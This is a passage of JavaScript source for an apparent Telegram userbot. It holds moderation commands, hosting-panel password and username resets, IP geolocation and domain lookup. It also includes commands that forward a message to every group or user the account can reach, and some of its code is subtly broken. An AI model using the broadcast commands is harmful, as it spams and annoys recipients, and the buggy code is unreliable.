      return client.sendMessage(message.chatId, {
        message:
          "<blockquote>⚠️ ʀᴇᴘʟʏ ᴘᴇsᴀɴ ᴀᴛᴀᴜ ᴛᴀɢ</blockquote>",
        parseMode: "html",
        replyTo: message.id,
      });
    }

    try {
      await client.invoke(
        new Api.channels.EditBanned({
          channel: message.chatId,
          participant: target.id,
          bannedRights: new Api.ChatBannedRights({}),
        })
      );

      await client.sendMessage(message.chatId, {
        message: `<blockquote><b>${target.username ? "@" + target.username : target.firstName}</b> ᴋᴀᴄɪᴀɴ ᴋᴀᴄᴜɴɢ ʜᴀʙɪs ᴅɪʙᴀɴ 🤪</blockquote>`,
        parseMode: "html",
      });
    } catch (e) {
      await client.sendMessage(message.chatId, {
        message: `<blockquote>⚠️ ɢᴀɢᴀʟ ᴜɴʙᴀɴ ᴜsᴇʀ: ${e.errorMessage || e.message}</blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });
    }
    break;
  }

  case "kick": {
    const target = await getTargetUser(client, message, args);
    if (!target) {
      return client.sendMessage(message.chatId, {
        message:
          "<blockquote>⚠️ ʀᴇᴘʟʏ ᴘᴇsᴀɴ ᴀᴛᴀᴜ ᴛᴀɢ</blockquote>",
        parseMode: "html",
        replyTo: message.id,
      });
    }

    try {
      await client.invoke(
        new Api.channels.EditBanned({
          channel: message.chatId,
          participant: target.id,
          bannedRights: new Api.ChatBannedRights({ viewMessages: true }),
        })
      );

      setTimeout(async () => {
        await client.invoke(
          new Api.channels.EditBanned({
            channel: message.chatId,
            participant: target.id,
            bannedRights: new Api.ChatBannedRights({}),
          })
        );
      }, 1500);

      await client.sendMessage(message.chatId, {
        message: `<blockquote><b>${target.username ? "@" + target.username : target.firstName}</b> ᴍᴀᴍᴘᴜs ʜᴀᴍᴀ ᴅɪᴋɪᴄᴋ 😈</blockquote>`,
        parseMode: "html",
      });
    } catch (e) {
      await client.sendMessage(message.chatId, {
        message: `<blockquote>⚠️ ɢᴀɢᴀʟ ᴋɪᴄᴋ ᴜsᴇʀ: ${e.errorMessage || e.message}</blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });
    }
    break;
  }

case "mute": {
  const target = await getTargetUser(client, message, args);
  if (!target) {
    return client.sendMessage(message.chatId, {
      message:
        "<blockquote>⚠️ ʀᴇᴘʟʏ ᴘᴇsᴀɴ ᴀᴛᴀᴜ ᴛᴀɢ</blockquote>",
      parseMode: "html",
      replyTo: message.id,
    });
  }

  const dur = parseDuration(args[0]);
  const reason = dur ? args.slice(1).join(" ") : args.join(" ");

  const untilDate = dur ? Math.floor(Date.now() / 1000) + dur : 0;

  try {
    await client.invoke(
      new Api.channels.EditBanned({
        channel: message.chatId,
        participant: target.id,
        bannedRights: new Api.ChatBannedRights({
          sendMessages: true,
          untilDate: untilDate || undefined,
        }),
      })
    );

    const userTag = target.username ? "@" + target.username : target.firstName;
    let durationText = dur
      ? `selama <b>${args[0]}</b>`
      : "<b>permanen</b>";
    let reasonText = reason ? `<blockquote>\n📝 ᴀʟᴀsᴀɴ: <i>${reason}</i></blockquote>` : "";

    await client.sendMessage(message.chatId, {
      message: `<blockquote><b>${userTag}</b> ᴍᴀᴍᴘᴜs ᴋᴏɴᴛᴏʟ ᴅɪᴍᴜᴛᴇ ${durationText}😹${reasonText}</blockquote>`,
      parseMode: "html",
    });
  } catch (e) {
    await client.sendMessage(message.chatId, {
      message: `<blockquote>⚠️ ɢᴀɢᴀʟ ᴍᴜᴛᴇ ᴜsᴇʀ: ${e.errorMessage || e.message}</blockquote>`,
      parseMode: "html",
      replyTo: message.id,
    });
  }
  break;
}

  case "unmute": {
    const target = await getTargetUser(client, message, args);
    if (!target) {
      return client.sendMessage(message.chatId, {
        message:
          "<blockquote>⚠️ ʀᴇᴘʟʏ ᴘᴇsᴀɴ ᴀᴛᴀᴜ ᴛᴀɢ</blockquote>",
        parseMode: "html",
        replyTo: message.id,
      });
    }

    try {
      await client.invoke(
        new Api.channels.EditBanned({
          channel: message.chatId,
          participant: target.id,
          bannedRights: new Api.ChatBannedRights({}),
        })
      );

      await client.sendMessage(message.chatId, {
        message: `<blockquote><b>${target.username ? "@" + target.username : target.firstName}</b> ᴋᴀᴄɪᴀɴ ʜᴀʙɪs ᴅɪᴍᴜᴛᴇ 🤪</blockquote>`,
        parseMode: "html",
      });
    } catch (e) {
      await client.sendMessage(message.chatId, {
        message: `<blockquote>⚠️ ɢᴀɢᴀʟ ᴜɴᴍᴜᴛᴇ ᴜsᴇʀ: ${e.errorMessage || e.message}</blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });
    }
    break;
  }
  
case "resetpw": {
  (async () => {
    const chatId = message.chatId || message.chat?.id;
    const args = (message.text || "").trim().split(/\s+/).slice(1);

    const userId = args[0];
    const newPassword = args.slice(1).join(" ");

    if (!userId || !newPassword) {
      return client.sendMessage(chatId, { 
        message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}resetpw ID Pass_new</blockquote>`, 
        parseMode: "html",
        replyTo: message.id 
      });
    }

    const loadingMsg = await client.sendMessage(chatId, { 
      message: `<blockquote>⏳ sᴇᴅᴀɴɢ ᴍᴇɴɢᴜʙᴀʜ ᴘᴀssᴡᴏʀᴅ ᴜsᴇʀ ɪᴅ ${userId}...</blockquote>`, 
      parseMode: "html",
      replyTo: message.id 
    });

    try {
      const resGet = await fetch(`${domain}/api/application/users/${userId}`, {
        headers: { Authorization: `Bearer ${plta}`, Accept: "application/json" },
      });
      const userData = await resGet.json();

      if (!resGet.ok || !userData?.attributes) throw new Error("Gagal ambil data user");

      const user = userData.attributes;

      const body = {
        email: user.email,
        username: user.username,
        first_name: user.first_name,
        last_name: user.last_name,
        language: user.language || "en",
        root_admin: user.root_admin,
        password: newPassword,
        password_confirmation: newPassword,
      };

      const resPatch = await fetch(`${domain}/api/application/users/${userId}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json", Authorization: `Bearer ${plta}` },
        body: JSON.stringify(body),
      });

      const result = await resPatch.json();
      if (!resPatch.ok) throw new Error(result?.errors?.[0]?.detail || `Gagal reset password (HTTP ${resPatch.status})`);

      await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true }).catch(() => {});

      const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
      const msg = `<blockquote><b>✅ ʀᴇsᴇᴛ ᴘᴀssᴡᴏʀᴅ ʙᴇʀʜᴀsɪʟ</b>\n\n<b>👤 ᴜsᴇʀɴᴀᴍᴇ:</b> ${user.username}\n<b>📧 ᴇᴍᴀɪʟ:</b> ${user.email}\n<b>🆔 ᴜsᴇʀ ɪᴅ:</b> ${user.id}\n<b>🔑 ᴘᴀssᴡᴏʀᴅ ʙᴀʀᴜ:</b> <code>${newPassword}</code>\n<b>🕒 ᴡᴀᴋᴛᴜ:</b> ${waktu}</blockquote>`;

      await client.sendMessage(chatId, { message: msg, parseMode: "html" });

    } catch (err) {
      console.error("ResetPW Error:", err.message);
      await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true }).catch(() => {});
      await client.sendMessage(chatId, { 
        message: `<blockquote>❌ ɢᴀɢᴀʟ ʀᴇsᴇᴛ passworᴅ.\n<b>ᴅᴇᴛᴀɪʟ:</b> ${err.message}</blockquote>`, 
        parseMode: "html", 
        replyTo: message.id 
      });
    }
  })();
  break;
}

case "setuser": {
  (async () => {
    const chatId = message.chatId || message.chat?.id;
    const args = (message.text || "").trim().split(/\s+/).slice(1);

    const userId = args[0];
    const newUsername = args.slice(1).join(" ");

    if (!userId || !newUsername) {
      return client.sendMessage(chatId, {
        message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}edituser ID Username_new</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }

    const loadingMsg = await client.sendMessage(chatId, {
      message: `<blockquote>⏳ sᴇᴅᴀɴɢ ᴍᴇɴɢᴜʙᴀʜ ɴᴀᴍᴀ ᴜsᴇʀɴᴀᴍᴇ ɪᴅ ${userId}...</blockquote>`,
      parseMode: "html",
      replyTo: message.id
    });

    try {
      const resGet = await fetch(`${domain}/api/application/users/${userId}`, {
        headers: { Authorization: `Bearer ${plta}`, Accept: "application/json" },
      });

      const userData = await resGet.json();
      if (!resGet.ok || !userData?.attributes)
        throw new Error("Gagal mengambil data user.");

      const user = userData.attributes;

      const body = {
        email: user.email,
        username: newUsername,
        first_name: user.first_name,
        last_name: user.last_name,
        language: user.language || "en",
        root_admin: user.root_admin,
      };

      const resPatch = await fetch(`${domain}/api/application/users/${userId}`, {
        method: "PATCH",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${plta}`,
        },
        body: JSON.stringify(body),
      });

      const result = await resPatch.json();
      if (!resPatch.ok)
        throw new Error(
          result?.errors?.[0]?.detail ||
          `Gagal mengedit user (HTTP ${resPatch.status})`
        );

      await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true }).catch(() => {});

      const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
      const msg = `<blockquote><b>✅ ᴜsᴇʀɴᴀᴍᴇ ʙᴇʀʜᴀsɪʟ ᴅɪᴘᴇʀʙᴀʀᴜɪ</b>\n\n<b>🆔 ᴜsᴇʀ ɪᴅ:</b> ${user.id}\n<b>👤 ᴜsᴇʀɴᴀᴍᴇ ʟᴀᴍᴀ:</b> ${user.username}\n<b>🆕 ᴜsᴇʀɴᴀᴍᴇ ʙᴀʀᴜ:</b> ${newUsername}\n<b>📧 ᴇᴍᴀɪʟ:</b> ${user.email}\n<b>🕒 ᴡᴀᴋᴛᴜ:</b> ${waktu}</blockquote>`;

      await client.sendMessage(chatId, { message: msg, parseMode: "html" });

    } catch (err) {
      console.error("EditUser Error:", err.message);
      await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true }).catch(() => {});
      await client.sendMessage(chatId, {
        message: `<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇɴɢᴇᴅɪᴛ usernamᴇ.\n<b>ᴅᴇᴛᴀɪʟ:</b> ${err.message}</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}

case "trackip": {
  (async () => {
    const chatId = message.chatId || message.chat?.id;
    const args = (message.text || "").trim().split(/\s+/).slice(1);

    if (args.length < 1) {
      await client.sendMessage(chatId, {
        message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> <code>${prefix}trackip &lt;ip&gt;</code></blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });
      return;
    }

    const target = args[0];

    if (target === "0.0.0.0") {
      await client.sendMessage(chatId, {
        message: "<blockquote>⚠️ ᴊᴀɴɢᴀɴ ᴅɪ ᴜʟᴀɴɢɪ ᴍᴀɴɪs, ɴᴀɴᴛɪ ᴜsᴇʀᴍᴜ ʙɪsᴀ ᴅɪʜᴀᴘᴜs 😅</blockquote>",
        parseMode: "html",
        replyTo: message.id,
      });
      return;
    }

    try {
      const resGeo = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${target}`);
      const resWho = await fetch(`https://ipwho.is/${target}`);

      if (!resGeo.ok || !resWho.ok) {
        throw new Error(`Gagal mengambil data IP. Status: ${resGeo.status} / ${resWho.status}`);
      }

      const ipInfo = await resGeo.json();
      const additionalInfo = await resWho.json();

      if (!ipInfo || typeof ipInfo !== "object" || Object.keys(ipInfo).length === 0) {
        throw new Error("Data dari api.ipgeolocation.io tidak valid.");
      }
      if (!additionalInfo || typeof additionalInfo !== "object" || Object.keys(additionalInfo).length === 0) {
        throw new Error("Data dari ipwho.is tidak valid.");
      }

      const messageText = `<blockquote>
🌍 <b>ɪɴғᴏʀᴍᴀsɪ ɪᴘ ${target}</b>

🏳️ ғʟᴀɢs: ${ipInfo.country_flag || "N/A"}
🌐 ᴄᴏᴜɴᴛʀʏ: ${ipInfo.country_name || "N/A"}
🏛 ᴄᴀᴘɪᴛᴀʟ: ${ipInfo.country_capital || "N/A"}
🏙 ᴄɪᴛʏ: ${ipInfo.city || "N/A"}
📡 ɪsᴘ: ${ipInfo.isp || "N/A"}
🏢 ᴏʀɢᴀɴɪᴢᴀᴛɪᴏɴ: ${ipInfo.organization || "N/A"}
📍 ʟᴀᴛɪᴛᴜᴅᴇ: ${ipInfo.latitude || "N/A"}
📍 ʟᴏɴɢɪᴛᴜᴅᴇ: ${ipInfo.longitude || "N/A"}

🗺 ɢᴏᴏɢʟᴇ ᴍᴀᴘs: https://www.google.com/maps/place/${additionalInfo.latitude || ""}+${additionalInfo.longitude || ""}
</blockquote>`;

      await client.sendMessage(chatId, {
        message: messageText,
        parseMode: "html",
        replyTo: message.id,
      });
    } catch (error) {
      console.error(`Error melacak ${target}:`, error);
      await client.sendMessage(chatId, {
        message: `❌ ᴇʀʀᴏʀ ᴍᴇʟᴀᴄᴀᴋ ${target}. sɪʟᴀʜᴋᴀɴ ᴄᴏʙᴀ ʟᴀɢɪ nantɪ.\nᴇʀʀᴏʀ: ${error.message}`,
        parseMode: "html",
        replyTo: message.id,
      });
    }
  })();
  break;
}

const whois = require("whois-json");
const dns = require("dns").promises;

function extractHostname(input) {
  try {
    if (/^https?:\/\//i.test(input)) {
      const u = new URL(input);
      return u.hostname;
    }
    const s = input.split("/")[0];
    return s.replace(/^https?:\/\//i, "").replace(/^www\./i, "");
  } catch {
    return null;
  }
}

function isValidHost(host) {
  if (!host || typeof host !== "string") return false;
  if (!host.includes(".")) return false;
  if (host.length > 253) return false;
  const labels = host.split(".");
  for (const lbl of labels) {
    if (!lbl || lbl.length > 63) return false;
    if (!/^[a-z0-9-]+$/i.test(lbl)) return false;
    if (/^-|-$/.test(lbl)) return false;
  }
  return true;
}

function parseWhoisExpiry(whoisData) {
  if (!whoisData) return {};
  const expiry = whoisData.expiryDate || whoisData.expires || whoisData["Registrar Registration Expiration Date"] || whoisData["paid-till"];
  const created = whoisData.creationDate || whoisData.createdDate || whoisData["Creation Date"] || whoisData["created"];
  const registrar = whoisData.registrar || whoisData.sponsoringRegistrar || whoisData["Registrar"];
  const status = whoisData.status || whoisData.DomainStatus;
  return { expiry, created, registrar, status };
}

function parseRdapEvents(rdapJson) {
  if (!rdapJson) return {};
  let created = null, expiry = null, registrar = rdapJson.registrar || null;
  const events = rdapJson.events || rdapJson.event || [];
  for (const ev of events) {
    const action = (ev.action || "").toLowerCase();
    const date = ev.eventDate || ev.date || ev.event?.eventDate;
    if (!date) continue;
    if (action.includes("registration") || action.includes("create")) created = created || date;
    if (action.includes("expiration") || action.includes("expire")) expiry = expiry || date;
  }
  return { created, expiry, registrar };
}

case "cekhost": {
  (async () => {
    const chatId = message.chatId || message.chat?.id;
    const args = (message.text || "").trim().split(/\s+/).slice(1);
    const input = args.join(" ").trim();

    if (!input) {
      return client.sendMessage(chatId, {
        message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> <code>${prefix}cekhost &lt;domain&gt;</code>\nContoh: <code>${prefix}cekhost example.my.id</code></blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });
    }

    function extractHostname(input) {
      try {
        if (/^https?:\/\//i.test(input)) {
          const u = new URL(input);
          return u.hostname;
        }
        return input.split("/")[0].replace(/^www\./i, "");
      } catch { return null; }
    }

    const host = extractHostname(input);
    if (!host) return client.sendMessage(chatId, { message: "<blockquote>❌ ᴅᴏᴍᴀɪɴ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ</blockquote>", parseMode: "html", replyTo: message.id });

    let loadingMsg;
    try {
      loadingMsg = await client.sendMessage(chatId, { message: `<blockquote>🔍 ᴍᴇᴍᴇʀɪᴋsᴀ ʜᴏsᴛ: <code>${host}</code></blockquote>`, parseMode: "html" });
    } catch {}

    try {
      let ips = [];
      try {
        const dnsRes = await axios.get(`https://dns.google/resolve?name=${host}&type=A`, { timeout: 6000 });
        if (dnsRes?.data?.Answer)
          ips = dnsRes.data.Answer.filter(a => a.type === 1).map(a => a.data);
      } catch {}
      const ipDisplay = ips.length ? ips.join(", ") : "Tidak ditemukan";

      let isOnline = false;
      try {
        const resHttps = await axios.get(`https://${host}`, { timeout: 5000, validateStatus: null });
        if (resHttps.status >= 200 && resHttps.status < 400) isOnline = true;
        else {
          const resHttp = await axios.get(`http://${host}`, { timeout: 5000, validateStatus: null });
          if (resHttp.status >= 200 && resHttp.status < 400) isOnline = true;
        }
      } catch { isOnline = false; }
      const statusText = isOnline ? "🟢 ONLINE" : "🔴 OFFLINE";

      let registrar = "Tidak diketahui";
      let created = "Tidak tersedia";
      let expiry = "Tidak tersedia";
      let country = "Tidak diketahui";

      try {
        const rdapRes = await axios.get(`https://rdap.org/domain/${encodeURIComponent(host)}`, { timeout: 10000 });
        const data = rdapRes.data;

        if (data) {
          registrar = data.registrar || (data.entities?.[0]?.vcardArray?.[1]?.find(x => x[0]==="org")?.[3]) || "Tidak diketahui";

          const events = data.events || data.event || [];
          for (const ev of events) {
            const action = (ev.action || "").toLowerCase();
            const date = ev.eventDate || ev.date;
            if (!date) continue;
            if (action.includes("registration") || action.includes("create")) created = created === "Tidak tersedia" ? date : created;
            if (action.includes("expiration") || action.includes("expire")) expiry = expiry === "Tidak tersedia" ? date : expiry;
          }

          country = data.country || data.entities?.[0]?.vcardArray?.[1]?.find(x => x[0]==="country")?.[3] || "Tidak diketahui";
        }
      } catch {}
      
      await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true }).catch(() => {});

      const messageText = `
<blockquote>
╭━━━⬣ <b>ɪɴғᴏʀᴍᴀsɪ ᴅᴏᴍᴀɪɴ</b> ⬣━━━╮
┃ 🌐 <b>ᴅᴏᴍᴀɪɴ:</b> <code>${host}</code>
┃ 📡 <b>sᴛᴀᴛᴜs:</b> ${statusText}
┃ 📍 <b>ɪᴘ:</b> <code>${ipDisplay}</code>
┃ 🏢 <b>ʀᴇɢɪsᴛʀᴀsɪ:</b> ${registrar}
┃ 📆 <b>ᴅɪʙᴜᴀᴛ:</b> ${created}
┃ ⏳ <b>ᴋᴀᴅᴀʟᴜᴀʀsᴀ:</b> ${expiry}
┃ 🌍 <b>ɴᴇɢᴀʀᴀ:</b> ${country}
╰━━━━━━━━━━━━━━━━━━━━━━⬣
© ʙʏ ʏᴀᴋᴜᴢᴀ 👑
</blockquote>
`;

      await client.sendMessage(chatId, { message: messageText, parseMode: "html", replyTo: message.id });

    } catch (err) {
      console.error("Error cekhost:", err);
      await client.sendMessage(chatId, { message: "<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ sᴀᴀᴛ ᴍᴇɴɢᴇᴄᴇᴋ ʜᴏsᴛ/ᴅᴏᴍᴀɪɴ</blockquote>", parseMode: "html", replyTo: message.id });
    } finally {
      if (loadingMsg) {
        try { await client.DeleteMessage(chatId, loadingMsg.id), { revoke: true }; } catch {}
      }
    }
  })();
  break;
}

// CASE DEL
function getRepliedIdFromMessage(msg) {
  return (
    msg?.replyTo?.replyToMsgId ||
    msg?.replyTo?.msgId ||
    msg?.replyTo?.id ||
    msg?.reply_to_message?.message_id ||
    msg?.reply_to_message?.id ||
    msg?.reply_to_msg_id ||
    null
  );
}

async function safeDeleteMessage(client, chatId, messageId) {
  if (!messageId) return false;

  try {
    if (typeof client.deleteMessages === "function") {
      try {
        await client.deleteMessages(chatId, [messageId], { revoke: true });
        return true;
      } catch (e1) {
        try {
          await client.deleteMessages(chatId, [messageId]);
          return true;
        } catch (e2) {
        }
      }
    }
  } catch (e) {
  }

  try {
    if (typeof client.deleteMessage === "function") {
      await client.deleteMessage(chatId, messageId);
      return true;
    }
  } catch (e) {
  }

  try {
    if (client.invoke && Api && Api.messages && Api.messages.DeleteMessages) {
      await client.invoke(new Api.messages.DeleteMessages({ id: [messageId] }));
      return true;
    }
  } catch (e) {
  }

  return false;
}

case "del": {
  (async () => {
    const chatId = message.chatId || message.chat?.id;

    if (!message.replyTo && !message.reply_to_message) {
      return client.sendMessage(chatId, {
        message:
          "<blockquote>⚠️ <b>ʀᴇᴘʟʏ ᴘᴇsᴀɴ</b></blockquote>",
        parseMode: "html",
        replyTo: message.id,
      });
    }

    const repliedId = getRepliedIdFromMessage(message);
    if (!repliedId) {
      try {
        const replyRef = message.replyTo || message.reply_to_message;
        const maybeId = replyRef?.msgId || replyRef?.id || replyRef?.replyToMsgId;
        if (maybeId) {
        }
      } catch (e) {}
    }

    if (!repliedId) {
      return client.sendMessage(chatId, {
        message: "<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇɴᴇᴍᴜᴋᴀɴ ᴘᴇsᴀɴ ʏᴀɴɢ ᴅɪʀᴇᴘʟʏ</blockquote>",
        parseMode: "html",
        replyTo: message.id,
      });
    }

    try {
      const targetDeleted = await safeDeleteMessage(client, chatId, repliedId);
      const cmdId = message.id || message.messageId || message.msgId || message._id || null;
      if (cmdId) {
        try { await safeDeleteMessage(client, chatId, cmdId); } catch (e) {}
      }

      if (!targetDeleted) {
        return client.sendMessage(chatId, {
          message: "<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇɴɢʜᴀᴘᴜs ᴘᴇsᴀɴ ᴛᴀʀɢᴇᴛ</blockquote>",
          parseMode: "html",
          replyTo: message.id,
        });
      }

      return;
    } catch (err) {
      console.error("Del error:", err);
      return client.sendMessage(chatId, {
        message: `<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇɴɢʜᴀᴘᴜs ᴘᴇsᴀɴ.\nᴅᴇᴛᴀɪʟ: ${String(err.message || err)}</blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });
    }
  })();
  break;
}

case "cfdgroup": {
  (async () => {
    try {
      const chatId = message.chatId || message.chat?.id;
      if (!chatId) return;

      const repliedId =
        message.replyTo?.id ||
        message.reply_to_message?.id ||
        message.replyTo?.replyToMsgId ||
        null;

      const blFile = path.join(__dirname, "./database/blacklist.json");

      let blacklist = [];
      if (fs.existsSync(blFile)) {
        try {
          const raw = fs.readFileSync(blFile, "utf-8") || "[]";
          const data = JSON.parse(raw);
          if (Array.isArray(data)) {
            blacklist = data.map((b) => String(b.id).trim());
          }
        } catch (err) {
        
        }
      }

      if (!repliedId) {
        return await client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>ʙᴀʟᴀs ᴘᴇsᴀɴ</b> ʏᴀɴɢ ɪɴɢɪɴ ᴅɪᴋɪʀɪᴍ ᴋᴇ sᴇᴍᴜᴀ ɢʀᴜᴘ</blockquote>`,
          parseMode: "html",
          replyTo: message.id,
        });
      }

      let targetMsg = null;
      try {
        const res = await client.getMessages(chatId, { ids: repliedId });
        targetMsg = Array.isArray(res) ? res[0] : res;
      } catch (e) {
        console.error("❌ Gagal ambil pesan:", e);
        return await client.sendMessage(chatId, {
          message: `<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇɴɢᴀᴍʙɪʟ ᴘᴇsᴀɴ ʏᴀɴɢ ᴅɪʀᴇᴘʟʏ</blockquote>`,
          parseMode: "html",
          replyTo: message.id,
        });
      }

      let loadingMsg = null;
      try {
        loadingMsg = await client.sendMessage(chatId, {
          message: "<blockquote>🚀 ᴍᴇɴɢɪʀɪᴍ ᴘᴇsᴀɴ ᴋᴇ sᴇᴍᴜᴀ ɢʀᴏᴜᴘ...</blockquote>",
          parseMode: "html",
        });
      } catch (e) {
        console.warn("⚠️ Tidak bisa kirim pesan loading:", e.message);
      }

      let dialogs = [];
      try {
        dialogs = await client.getDialogs({ limit: 1000 });
      } catch (e) {
        console.error("❌ Gagal ambil daftar grup:", e);
      }

      const groups = dialogs.filter((d) => d.isGroup && !d.isUser);
      if (!groups.length) {
        if (loadingMsg?.id) await client.deleteMessages(chatId, [loadingMsg.id]).catch(() => {});
        return await client.sendMessage(chatId, {
          message: "<blockquote>⚠️ ᴛɪᴅᴀᴋ ᴍᴇɴᴇᴍᴜᴋᴀɴ ɢʀᴏᴜᴘ ᴜɴᴛᴜᴋ ᴅɪᴋɪʀɪᴍ ᴘᴇsᴀɴ</blockquote>",
          parseMode: "html",
          replyTo: message.id,
        });
      }

      let sukses = 0;
      let gagal = 0;
      let skipped = 0;

      for (const g of groups) {
        const groupId = String(g.id || g.dialogId || g.entity?.id || "").trim();
        if (!groupId || groupId === String(chatId)) continue;

        if (blacklist.some((bl) => bl === groupId)) {
          skipped++;
          continue;
        }

        try {
          await client.forwardMessages(groupId, {
            messages: [targetMsg.id],
            fromPeer: chatId,
          });
          sukses++;
        } catch (err) {
          console.warn(`⚠️ Gagal kirim ke grup ${groupId}: ${err.message}`);
          gagal++;
        }

        await new Promise((r) => setTimeout(r, 800));
      }

      if (loadingMsg?.id) {
        try {
          await client.deleteMessages(chatId, [loadingMsg.id]);
        } catch {
        }
      }

      await client.sendMessage(chatId, {
        message: `<blockquote>✅ <b>ᴘᴇɴɢɪʀɪᴍᴀɴ sᴇʟᴇsᴀɪ</b>\n\n👥 ᴛᴏᴛᴀʟ ɢʀᴏᴜᴘ: <b>${groups.length}</b>\n✅ ʙᴇʀʜᴀsɪʟ: <b>${sukses}</b>\n❌ ɢᴀɢᴀʟ: <b>${gagal}</b></blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });
    } catch (err) {
      console.error("❌ Error utama cfdgroup:", err);
      try {
        await client.sendMessage(message?.chat?.id || chatId || "me", {
          message: `<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ: ${err.message}</blockquote>`,
          parseMode: "html",
          replyTo: message?.id,
        });
      } catch {}
    }
  })();
  break;
}

case "addbl": {
  (async () => {
    const chatId = message.chatId || message.chat?.id;
    const chatTitle = message.chat?.title || "Private/Unknown";

    if (!message.isGroup && !message.chat?.title) {
      return client.sendMessage(chatId, {
        message: `<blockquote>⚠️ ᴘᴇʀɪɴᴛᴀʜ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪɢᴜɴᴀᴋᴀɴ ᴅɪ ɢʀᴏᴜᴘ</blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });
    }

    let blacklist = JSON.parse(fs.readFileSync(blFile, "utf-8"));

    if (blacklist.some((b) => String(b.id) === String(chatId))) {
      return client.sendMessage(chatId, {
        message: `<blockquote>⚠️ ɢʀᴏᴜᴘ <b>${chatTitle}</b> sᴜᴅᴀʜ ᴀᴅᴀ ᴅɪ ʙʟᴀᴄᴋʟɪsᴛ</blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });
    }

    blacklist.push({ id: chatId, group: chatTitle });
    fs.writeFileSync(blFile, JSON.stringify(blacklist, null, 2));

    await client.sendMessage(chatId, {
      message: `<blockquote><b>👥️ ɢʀᴏᴜᴘ: ${chatTitle}</b>\n<b>🆔️ ɪᴅ ɢʀᴏᴜᴘ:</b> <code>${chatId}</code>\n<b>📝 ᴋᴇᴛ:</b> ʙᴇʀʜᴀsɪʟ ᴅɪᴛᴀᴍʙᴀʜᴋᴀɴ ᴋᴇ ʙʟᴀᴄᴋʟɪsʟ</blockquote>`,
      parseMode: "html",
      replyTo: message.id,
    });
  })();
  break;
}

case "unaddbl": {
  (async () => {
    const chatId = message.chatId || message.chat?.id;
    const chatTitle = message.chat?.title || "Private/Unknown";

    let blacklist = JSON.parse(fs.readFileSync(blFile, "utf-8"));
    const found = blacklist.find((b) => String(b.id) === String(chatId));

    if (!found) {
      return client.sendMessage(chatId, {
        message: `<blockquote>⚠️ ɢʀᴏᴜᴘ <b>${chatTitle}</b> ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴅɪ ʙʟᴀᴄᴋʟɪsᴛ</blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });
    }

    blacklist = blacklist.filter((b) => String(b.id) !== String(chatId));
    fs.writeFileSync(blFile, JSON.stringify(blacklist, null, 2));

    await client.sendMessage(chatId, {
      message: `<blockquote>✅ ɢʀᴏᴜᴘ <b>${chatTitle}</b> ʙᴇʀʜᴀsɪʟ ᴅɪʜᴀᴘᴜs ᴅᴀʀɪ ʙʟᴀᴄᴋʟɪsᴛ</blockquote>`,
      parseMode: "html",
      replyTo: message.id,
    });
  })();
  break;
}

case "blacklist": {
  (async () => {
    const chatId = message.chatId || message.chat?.id;
    const blacklist = JSON.parse(fs.readFileSync(blFile, "utf-8"));

    if (!blacklist.length) {
      return client.sendMessage(chatId, {
        message: `<blockquote>❌️ ᴛɪᴅᴀᴋ ᴀᴅᴀ ɢʀᴏᴜᴘ ᴅᴀʟᴀᴍ ʙʟᴀᴄᴋʟɪsᴛ</blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });
    }

    const list = blacklist
      .map((b, i) => `${i + 1}. <b>${b.group}</b> — <code>${b.id}</code>`)
      .join("\n");

    await client.sendMessage(chatId, {
      message: `<blockquote><b>🚫 ᴅᴀғᴛᴀᴛ ɢʀᴏᴜᴘ ʏᴀɴɢ ᴅɪ ʙʟᴀᴄᴋʟɪsᴛ:</b>\n\n${list}</blockquote>`,
      parseMode: "html",
      replyTo: message.id,
    });
  })();
  break;
}

case "cfdall": {
  (async () => {
    const chatId = message.chatId || message.chat?.id;
    const args = (message.message || "").split(/\s+/).slice(1);
    const text = args.join(" ");

    if (!text) {
      return client.sendMessage(chatId, {
        message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}cfdall pesan</blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });
    }

    let loading;
    try {
      loading = await client.sendMessage(chatId, {
        message: `<blockquote>🚀 ᴍᴇɴɢɪʀɪᴍ ᴘᴇsᴀɴ ᴋᴇ sᴇᴍᴜᴀ ᴜsᴇʀ...</blockquote>`,
        parseMode: "html",
      });
    } catch {}

    let dialogs = [];
    try {
      dialogs = await client.getDialogs({ limit: 2000 });
    } catch (e) {
